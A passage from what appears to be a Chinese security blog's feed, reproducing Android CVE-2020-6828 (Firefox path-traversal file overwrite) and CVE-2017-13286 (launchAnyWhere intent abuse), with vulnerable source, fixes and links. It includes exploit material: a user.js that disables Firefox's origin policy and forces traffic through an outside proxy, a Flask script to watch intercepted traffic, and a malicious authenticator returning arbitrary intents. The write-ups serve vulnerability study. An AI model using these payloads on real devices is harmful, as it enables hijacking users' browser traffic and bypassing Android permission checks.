class="keyword">final</span> String[] projection = &#123;<span class="string">&quot;_display_name&quot;</span>&#125;;</span><br><span class="line">    String fileName = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> (Cursor metaCursor = cr.query(uri, projection, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>);) &#123;</span><br><span class="line">        <span class="keyword">if</span> (metaCursor.moveToFirst()) &#123;</span><br><span class="line">            fileName = metaCursor.getString(<span class="number">0</span>);<span class="comment">//直接返回字段值，没有任何处理</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fileName;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//FileUtils.copy() 从srcUri中读取内容保存到dstFile中，事实上应该是打开对应文件的Stream</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">copy</span><span class="params">(<span class="keyword">final</span> Context context, <span class="keyword">final</span> Uri srcUri, <span class="keyword">final</span> File dstFile)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> (InputStream inputStream = context.getContentResolver().openInputStream(srcUri);</span><br><span class="line">         OutputStream outputStream = <span class="keyword">new</span> FileOutputStream(dstFile)) &#123;</span><br><span class="line">        IOUtils.copy(inputStream, outputStream);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>getOriginalFilePathFromUri()</code>大概是在把传入的Uri当作一个文件资源来处理，对漏洞分析的关系不大。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="meta">@Nullable</span> <span class="function">String <span class="title">getOriginalFilePathFromUri</span><span class="params">(<span class="keyword">final</span> Context context, <span class="keyword">final</span> Uri uri)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// DocumentProvider</span></span><br><span class="line">    <span class="keyword">if</span> (Build.VERSION.SDK_INT &gt;= <span class="number">19</span> &amp;&amp; DocumentsContract.isDocumentUri(context, uri)) &#123;</span><br><span class="line">        <span class="comment">// ExternalStorageProvider</span></span><br><span class="line">        <span class="keyword">if</span> (isExternalStorageDocument(uri)) &#123;</span><br><span class="line">            <span class="keyword">final</span> String docId = DocumentsContract.getDocumentId(uri);</span><br><span class="line">            <span class="comment">// The AOSP ExternalStorageProvider creates document IDs of the form</span></span><br><span class="line">            <span class="comment">// &quot;storage device ID&quot; + &#x27;:&#x27; + &quot;document path&quot;.</span></span><br><span class="line">            <span class="keyword">final</span> String[] split = docId.split(<span class="string">&quot;:&quot;</span>);</span><br><span class="line">            <span class="keyword">final</span> String type = split[<span class="number">0</span>];</span><br><span class="line">            <span class="keyword">final</span> String docPath = split[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">final</span> String rootPath;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;primary&quot;</span>.equalsIgnoreCase(type)) &#123;</span><br><span class="line">                rootPath = Environment.getExternalStorageDirectory().getAbsolutePath();</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                rootPath = FileUtils.getExternalStoragePath(context, type);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> !TextUtils.isEmpty(rootPath) ?</span><br><span class="line">                rootPath + <span class="string">&quot;/&quot;</span> + docPath : <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (isDownloadsDocument(uri)) &#123; <span class="comment">// DownloadsProvider</span></span><br><span class="line">            <span class="keyword">final</span> String id = DocumentsContract.getDocumentId(uri);</span><br><span class="line">            <span class="comment">// workaround for issue (https://bugzilla.mozilla.org/show_bug.cgi?id=1502721) and</span></span><br><span class="line">            <span class="comment">// as per https://github.com/Yalantis/uCrop/issues/318#issuecomment-333066640</span></span><br><span class="line">            <span class="keyword">if</span> (!TextUtils.isEmpty(id)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (id.startsWith(<span class="string">&quot;raw:&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> id.replaceFirst(<span class="string">&quot;raw:&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">final</span> Uri contentUri = ContentUris.withAppendedId(</span><br><span class="line">                        Uri.parse(<span class="string">&quot;content://downloads/public_downloads&quot;</span>), Long.valueOf(id));</span><br><span class="line">                    <span class="keyword">return</span> getDataColumn(context, contentUri, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (NumberFormatException e) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (isMediaDocument(uri)) &#123; <span class="comment">// MediaProvider</span></span><br><span class="line">            <span class="keyword">final</span> String docId = DocumentsContract.getDocumentId(uri);</span><br><span class="line">            <span class="keyword">final</span> String[] split = docId.split(<span class="string">&quot;:&quot;</span>);</span><br><span class="line">            <span class="keyword">final</span> String type = split[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">            Uri contentUri = <span class="keyword">null</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;image&quot;</span>.equals(type)) &#123;</span><br><span class="line">                contentUri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;video&quot;</span>.equals(type)) &#123;</span><br><span class="line">                contentUri = MediaStore.Video.Media.EXTERNAL_CONTENT_URI;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;audio&quot;</span>.equals(type)) &#123;</span><br><span class="line">                contentUri = MediaStore.Audio.Media.EXTERNAL_CONTENT_URI;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">final</span> String selection = <span class="string">&quot;_id=?&quot;</span>;</span><br><span class="line">            <span class="keyword">final</span> String[] selectionArgs = <span class="keyword">new</span> String[] &#123;</span><br><span class="line">                split[<span class="number">1</span>]</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> getDataColumn(context, contentUri, selection, selectionArgs);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;content&quot;</span>.equalsIgnoreCase(uri.getScheme())) &#123; <span class="comment">// MediaStore (and general)</span></span><br><span class="line">        <span class="comment">// Return the remote address</span></span><br><span class="line">        <span class="keyword">if</span> (isGooglePhotosUri(uri))</span><br><span class="line">            <span class="keyword">return</span> uri.getLastPathSegment();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> getDataColumn(context, uri, <span class="keyword">null</span>, <span class="keyword">null</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;file&quot;</span>.equalsIgnoreCase(uri.getScheme())) &#123; <span class="comment">// File</span></span><br><span class="line">        <span class="keyword">return</span> uri.getPath();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>综上所述，FileFox会基于读取的文件名构造文件路径，并从<code>content provider</code>中去读取资源写入对应文件中。<br>因为文件名可控且没有经过合理的处理，于是可以构造诸如<code>../../file</code>的文件名跳出当前目录。<br>我们可以构造恶意<code>content provider</code>和<code>Uri</code>然后调用FireFox去访问，达到的效果是FireFox会覆盖掉权限内的指定文件。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>文件覆盖只是漏洞的表现，如何利用该漏洞形成一定的威胁呢？<br>这里沿用漏洞提交者的思路，通过覆盖关键的配置文件修改FireFox的配置，进而对用户形成威胁。<br>具体思路如下：</p><ol><li><code>/data/data/org.mozilla.firefox/files/mozilla/profiles.ini</code>是Firefox的配置文件，其中的<code>Path</code>字段记录了Firefox的工作路径，一般是一个随机目录名。在这个目录中，会有一个<code>prefs.js</code>文件，记录的Firefox的相关设置参数，通过<code>about:config</code>可以在浏览器中设置参数修改该文件。或者在工作目录中配置<code>user.js</code>文件来修改浏览器设置。</li><li>先覆盖<code>profiles.ini</code>，修改<code>Path=.</code>，把工作路径换成<code>/data/data/org.mozilla.firefox/files/mozilla/</code>。</li><li>再创建<code>/data/data/org.mozilla.firefox/files/mozilla/user.js</code>文件，修改浏览器配置。</li></ol><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//profiles.ini</span></span><br><span class="line">[Profile0]</span><br><span class="line">Name=<span class="keyword">default</span></span><br><span class="line">Default=<span class="number">1</span></span><br><span class="line">IsRelative=<span class="number">1</span></span><br><span class="line">Path=.</span><br><span class="line"></span><br><span class="line">[General]</span><br><span class="line">StartWithLastProfile=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//user.js 关闭同源策略，再设置一个8.8.8.8:8888的代理服务器</span></span><br><span class="line">user_pref(<span class="string">&quot;security.fileuri.strict_origin_policy&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">user_pref(<span class="string">&quot;network.proxy.http&quot;</span>, <span class="string">&quot;8.8.8.8&quot;</span>);</span><br><span class="line">user_pref(<span class="string">&quot;network.proxy.http_port&quot;</span>, <span class="number">8888</span>);</span><br><span class="line">user_pref(<span class="string">&quot;network.http.max-persistent-connections-per-server&quot;</span>, <span class="number">4</span>);</span><br><span class="line">user_pref(<span class="string">&quot;network.proxy.type&quot;</span>, <span class="number">1</span>);</span><br><span class="line">user_pref(<span class="string">&quot;network.proxy.socks_remote_dns&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">user_pref(<span class="string">&quot;network.proxy.ssl&quot;</span>, <span class="string">&quot;8.8.8.8&quot;</span>);</span><br><span class="line">user_pref(<span class="string">&quot;network.proxy.ssl_port&quot;</span>, <span class="number">8888</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Payload程序工作流程：</p><ol><li>释放<code>profiles.ini</code>和<code>user.js</code>到指定目录。</li><li>PayloadApk调用firefox先后访问这两个文件的Uri，覆盖配置文件，开启Firefox的代理设置。</li><li>在Payload的content provider中，可以使用<code>MatrixCursor</code>模拟返回，重写<code>public ParcelFileDescriptor openFile(Uri uri, String mode)</code>修改Uri对应资源的路径。</li><li>修改配置之后，重启Firefox，可以看到浏览器通过代理访问网站。</li></ol><p>在代理服务器上，简单写一个flask观察访问流量。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, Response, json, jsonify, make_response</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;JSON_AS_ASCII&#x27;</span>] = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proxy</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;request url:&quot;</span>, request.url)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;msg&quot;</span>: <span class="string">&quot;you are visiting &quot;</span> + request.url&#125;</span><br><span class="line">    mheaders = &#123;h[<span class="number">0</span>]: h[<span class="number">1</span>] <span class="keyword">for</span> h <span class="keyword">in</span> request.headers&#125;</span><br><span class="line">    <span class="keyword">return</span> requests.request(request.method, request.url, data=request.json, headers=mheaders).content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">8888</span>)</span><br></pre></td></tr></table></figure><p>复现代码：<a href="https://github.com/slient2009/CVE-PoCs">slient2009/CVE-PoCs (github.com)</a></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>对获取到的文件名进行清洗，返回真正的文件名。</p><p><a href="https://phabricator.services.mozilla.com/D65339">⚙ D65339 Bug 1617928 - Sanitize “content” uri filenames; r?AndreiLazar,snorp (mozilla.com)</a></p><p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210909120835823.png" alt="image-20210909120835823"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;参考相关博客，对CVE-2020-6828进行复现。该漏洞因为没有对文件名变量进行处理，导致任意文件覆盖。&lt;/p&gt;</summary>
    
    
    
    
    <category term="Android" scheme="http://slient2009.github.io/tags/Android/"/>
    
    <category term="CVE" scheme="http://slient2009.github.io/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2017-13286 复现</title>
    <link href="http://slient2009.github.io/2021/08/31/CVE-2017-13286/"/>
    <id>http://slient2009.github.io/2021/08/31/CVE-2017-13286/</id>
    <published>2021-08-31T04:00:00.000Z</published>
    <updated>2021-09-09T08:52:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>参考相关博客，对CVE-2017-13286进行复现。<br>第一次复现CVE，很多知识现学现用，代码也是“借鉴”了不少。</p><span id="more"></span><h1 id="CVE-2017-13286"><a href="#CVE-2017-13286" class="headerlink" title="CVE-2017-13286"></a>CVE-2017-13286</h1><blockquote><p>参考文章：<br>[<a href="https://bbs.pediy.com/thread-268506.htm">原创]CVE-2017-13286漏洞分析及利用-Android安全-看雪论坛-安全社区|安全招聘|bbs.pediy.com</a><br><a href="https://blogs.360.cn/post/launchanywhere-google-bug-7699048.html">launchAnyWhere: Activity组件权限绕过漏洞解析(Google Bug 7699048 ) - 360 核心安全技术博客</a><br><a href="https://itw01.com/GPRXBEI.html">Bundle風水——Android序列化與反序列化不匹配漏洞詳解 - ITW01</a></p></blockquote><p>CVE-2017-13286是一个由于Parcelabel对象的序列化和发序列化操作不一致而导致的漏洞，它可以绕过检查直接修改手机密码。<br>测试环境为Nexus5 + Android 8.0.0。</p><p>总的来说需要了解它包含的两个部分：</p><ol><li>Android-bug-7699048<br>Android-bug-7699048是存在于Android 2.3至4.3中的调用任意私有Activity漏洞。<br>它主要依赖于Android账户认证AccountManagerService的逻辑缺陷：具有账户认证能力的恶意应用可以向AccountManagerService返回精心构造的数据从而调起任意Activity。<br>对该漏洞的修补措施为：检查即将调起的Activity的签名是否和发起账户认证的Activity相同。</li><li>Android-bug-69683251<br>Android-bug-69683251是存在于<code>android/hardware/camera2/params/OutputConfiguration</code>中的序列化与反序列化不一致的漏洞。<br>负责序列化的writeToParcel()和负责反序列化的OutputConfiguration()的操作不一致，writeToParcel()写入的mIsShared位没有在OutputConfiguration()中被读出，从而导致了内存读写错位，使得有机会构造数据。<br>利用该漏洞，我们可以绕过对Android-bug-69683251的签名验证修补措施。</li></ol><h2 id="Android-bug-7699048"><a href="#Android-bug-7699048" class="headerlink" title="Android-bug-7699048"></a>Android-bug-7699048</h2><p>基于AccountManagerService的账户认证流程如下：</p><ol><li>AppA请求添加一个特定类型的网络账号</li><li>系统查询到AppB可以提供一个该类型的网络账号服务，系统向AppB发起请求</li><li>AppB返回了一个intent给系统，系统把intent转发给appA</li><li>AccountManagerResponse在AppA的进程空间内调用 startActivity(intent)调起一个Activity。<br>AccountManagerResponse是FrameWork中的代码， AppA对这一调用毫不知情。</li></ol><p>这种设计的本意是，AccountManagerService帮助AppA查找到AppB账号登陆页面，并呼起这个登陆页面。<br>而问题在于，AppB可以任意指定这个intent所指向的组件，AppA将在不知情的情况下由AccountManagerResponse调用起了一个Activity。<br>如果AppA是一个system权限应用，比如Settings，那么AppA能够调用起任意AppB指定的未导出Activity.</p><img src="https://raw.githubusercontent.com/slient2009/PicGo/main/img/image-20210829234217529.png" alt="image-20210829234217529" style="zoom: 50%;" /><p>AppB的MyAuthenticator类，该类整体继承于AccountManagerResponse。<br>addAccount()方法中返回bundle，这里可以构造一个启动指定Activity的intent并返回</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Bundle <span class="title">addAccount</span><span class="params">(AccountAuthenticatorResponse response, String accountType,</span></span></span><br><span class="line"><span class="params"><span class="function">    String authTokenType, String[] requiredFeatures, Bundle options)</span> </span>&#123;</span><br><span class="line">    Intent intent = <span class="keyword">new</span> Intent();</span><br><span class="line">    intent.setComponent(<span class="keyword">new</span> ComponentName(</span><br><span class="line">                            <span class="string">&quot;com.trick.trick &quot;</span>,</span><br><span class="line">                            <span class="string">&quot; com.trick. trick.AnyWhereActivity&quot;</span>));</span><br><span class="line">    intent.setAction(Intent.ACTION_RUN);</span><br><span class="line">    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);</span><br><span class="line">    <span class="keyword">final</span> Bundle bundle = <span class="keyword">new</span> Bundle();</span><br><span class="line">    bundle.putParcelable(AccountManager.KEY_INTENT, intent);</span><br><span class="line">    <span class="keyword">return</span> bundle;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>AccountManager.java 中处理AccountManagerService返回bundle的函数，运行在AppA的进程中。<br>这里从bundle中取出intent然后直接调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** Handles the responses from the AccountManager */</span></span><br><span class="line"><span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">Response</span> <span class="keyword">extends</span> <span class="title">IAccountManagerResponse</span>.<span class="title">Stub</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onResult</span><span class="params">(Bundle bundle)</span> </span>&#123;</span><br><span class="line">        Intent intent = bundle.getParcelable(KEY_INTENT);</span><br><span class="line">        <span class="keyword">if</span> (intent != <span class="keyword">null</span> &amp;&amp; mActivity != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">// since the user provided an Activity we will silently start intents</span></span><br><span class="line">            <span class="comment">// that we see</span></span><br><span class="line">            mActivity.startActivity(intent);</span><br><span class="line">            <span class="comment">// leave the Future running to wait for the real response to this request</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (bundle.getBoolean(<span class="string">&quot;retry&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                doWork();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> e.rethrowFromSystemServer();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            set(bundle);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述<code>Response.onResult(Bundle bundle)</code>方法在<code>AccountManagerService.Session$onResult(Bundle bundle)</code>方法中被调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//AccountManagerService.Session$onResult(Bundle bundle)，修复前</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onResult</span><span class="params">(Bundle result)</span> </span>&#123;</span><br><span class="line">    mNumResults++;</span><br><span class="line">    <span class="keyword">if</span> (result != <span class="keyword">null</span> &amp;&amp; !TextUtils.isEmpty(result.getString(AccountManager.KEY_AUTHTOKEN))) &#123;</span><br><span class="line">        String accountName = result.getString(AccountManager.KEY_ACCOUNT_NAME);</span><br><span class="line">        String accountType = result.getString(AccountManager.KEY_ACCOUNT_TYPE);</span><br><span class="line">        <span class="keyword">if</span> (!TextUtils.isEmpty(accountName) &amp;&amp; !TextUtils.isEmpty(accountType)) &#123;</span><br><span class="line">            Account account = <span class="keyword">new</span> Account(accountName, accountType);</span><br><span class="line">            cancelNotification(getSigninRequiredNotificationId(mAccounts, account),</span><br><span class="line">                               <span class="keyword">new</span> UserHandle(mAccounts.userId));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    IAccountManagerResponse response;</span><br><span class="line">    <span class="keyword">if</span> (mExpectActivityLaunch &amp;&amp; result != <span class="keyword">null</span></span><br><span class="line">        &amp;&amp; result.containsKey(AccountManager.KEY_INTENT)) &#123;<span class="comment">//AccountManager.KEY_INTENT也就是个&quot;intent&quot;</span></span><br><span class="line">        response = mResponse;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        response = getResponseAndClose();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (response != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (result == <span class="keyword">null</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (Log.isLoggable(TAG, Log.VERBOSE)) &#123;</span><br><span class="line">                    Log.v(TAG, getClass().getSimpleName()</span><br><span class="line">                          + <span class="string">&quot; calling onError() on response &quot;</span> + response);</span><br><span class="line">                &#125;</span><br><span class="line">                response.onError(AccountManager.ERROR_CODE_INVALID_RESPONSE,</span><br><span class="line">                                 <span class="string">&quot;null bundle returned&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (mStripAuthTokenFromResult) &#123;</span><br><span class="line">                    result.remove(AccountManager.KEY_AUTHTOKEN);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (Log.isLoggable(TAG, Log.VERBOSE)) &#123;</span><br><span class="line">                    Log.v(TAG, getClass().getSimpleName()</span><br><span class="line">                          + <span class="string">&quot; calling onResult() on response &quot;</span> + response);</span><br><span class="line">                &#125;</span><br><span class="line">                response.onResult(result);<span class="comment">//返回到发起APP去调起目标Activity</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            <span class="comment">// if the caller is dead then there is no one to care about remote exceptions</span></span><br><span class="line">            <span class="keyword">if</span> (Log.isLoggable(TAG, Log.VERBOSE)) &#123;</span><br><span class="line">                Log.v(TAG, <span class="string">&quot;failure while notifying response&quot;</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//修复后的AccountManagerService.java，添加了签名验证部分，只能调用AppA内部的Activity。</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onResult</span><span class="params">(Bundle result)</span> </span>&#123;</span><br><span class="line">    mNumResults++;</span><br><span class="line">    <span class="comment">//**********添加的修复代码，加入签名验证************//</span></span><br><span class="line">    Intent intent = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (result != <span class="keyword">null</span></span><br><span class="line">        &amp;&amp; (intent = result.getParcelable(AccountManager.KEY_INTENT)) != <span class="keyword">null</span>) &#123;<span class="comment">//尝试从parcel中提取一个intent</span></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 * The Authenticator API allows third party authenticators to</span></span><br><span class="line"><span class="comment">                 * supply arbitrary intents to other apps that they can run,</span></span><br><span class="line"><span class="comment">                 * this can be very bad when those apps are in the system like</span></span><br><span class="line"><span class="comment">                 * the System Settings.</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">        PackageManager pm = mContext.getPackageManager();</span><br><span class="line">        ResolveInfo resolveInfo = pm.resolveActivity(intent, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">int</span> targetUid = resolveInfo.activityInfo.applicationInfo.uid;</span><br><span class="line">        <span class="keyword">int</span> authenticatorUid = Binder.getCallingUid();</span><br><span class="line">        <span class="keyword">if</span> (PackageManager.SIGNATURE_MATCH !=<span class="comment">//验证签名是否一致</span></span><br><span class="line">            pm.checkSignatures(authenticatorUid, targetUid)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> SecurityException(</span><br><span class="line">                <span class="string">&quot;Activity to be started with KEY_INTENT must &quot;</span> +</span><br><span class="line">                <span class="string">&quot;share Authenticator&#x27;s signatures&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//**********添加的修复代码，加入签名验证************//</span></span><br><span class="line">    ......</span><br><span 